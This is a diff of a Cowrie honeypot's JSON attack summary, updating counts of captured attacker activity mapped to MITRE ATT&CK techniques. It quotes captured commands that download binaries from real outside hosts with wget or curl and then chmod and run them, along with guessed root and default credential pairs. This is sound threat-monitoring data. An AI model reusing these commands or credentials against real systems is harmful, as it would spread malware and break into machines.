@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-03 10:02:06",
+  "generated": "2026-09-03 11:04:11",
   "totals": {
-    "commands": 146,
-    "login_failed": 1235,
-    "login_success": 60,
-    "sessions": 1424
+    "commands": 177,
+    "login_failed": 1307,
+    "login_success": 67,
+    "sessions": 1494
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1235,
+      "count": 1307,
       "examples": [
         "root / P@ssw0rd123",
         "root / Fazel@1234",
@@ -21,14 +21,14 @@
         "root / P@ssw0rd1234"
       ],
       "first": "2026-09-03T00:01:47.872746Z",
-      "last": "2026-09-03T10:00:13.913374Z",
-      "unique_ips": 131
+      "last": "2026-09-03T10:59:35.859516Z",
+      "unique_ips": 142
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 60,
+      "count": 67,
       "examples": [
         "support / passw0rd",
         "debian / debian",
@@ -37,14 +37,14 @@
         "guest / guest"
       ],
       "first": "2026-09-03T00:16:24.431802Z",
-      "last": "2026-09-03T10:00:15.104945Z",
-      "unique_ips": 57
+      "last": "2026-09-03T10:49:07.140522Z",
+      "unique_ips": 64
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 41,
+      "count": 56,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -53,14 +53,14 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-09-03T04:07:44.788164Z",
-      "last": "2026-09-03T08:14:14.893063Z",
-      "unique_ips": 3
+      "last": "2026-09-03T10:10:12.530625Z",
+      "unique_ips": 4
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 29,
+      "count": 33,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://185.93.89.72/wget",
@@ -69,7 +69,19 @@
         "wget http://play.nopixel-rp.ir/iran.x86_64 -O x86_64 || curl http://play.nopixel-rp.ir/iran.x86_64 -o x86_64"
       ],
       "first": "2026-09-03T04:07:46.468687Z",
-      "last": "2026-09-03T07:17:55.556681Z",
+      "last": "2026-09-03T10:10:12.530625Z",
+      "unique_ips": 4
+    },
+    {
+      "id": "T1033",
+      "name": "System Owner/User Discovery",
+      "tactic": "Discovery",
+      "count": 3,
+      "examples": [
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
+      ],
+      "first": "2026-09-03T04:07:46.468687Z",
+      "last": "2026-09-03T10:09:36.715191Z",
       "unique_ips": 3
     },
     {
@@ -85,63 +97,55 @@
       "first": "2026-09-03T00:56:20.748613Z",
       "last": "2026-09-03T09:55:47.558296Z",
       "unique_ips": 3
-    },
-    {
-      "id": "T1033",
-      "name": "System Owner/User Discovery",
-      "tactic": "Discovery",
-      "count": 2,
-      "examples": [
-        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
-      ],
-      "first": "2026-09-03T04:07:46.468687Z",
-      "last": "2026-09-03T06:47:12.684070Z",
-      "unique_ips": 2
     }
   ],
   "unmapped": [
     [
+      "/bin/busybox",
+      14
+    ],
+    [
       "shell",
-      9
+      10
     ],
     [
       "sh",
-      9
+      10
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
       8
     ],
     [
-      "/bin/busybox",
+      "system",
       7
     ],
     [
-      "system",
-      6
+      "enable",
+      4
+    ],
+    [
+      "linuxshell",
+      4
     ],
     [
       "/bin/busybox UNSTABLE",
       3
     ],
     [
-      "enable",
-      3
-    ],
-    [
-      "linuxshell",
-      3
-    ],
-    [
       "enablelinuxshell",
-      2
+      3
     ],
     [
       "ping ;sh",
-      2
+      3
     ],
     [
       "cd /proc && cat self/cmdline",
+      3
+    ],
+    [
+      "busybox",
       2
     ],
     [
@@ -154,10 +158,6 @@
     ],
     [
       "User-Agent: Mozilla/5.0 zgrab/0.x",
-      1
-    ],
-    [
-      "busybox",
       1
     ],
     [
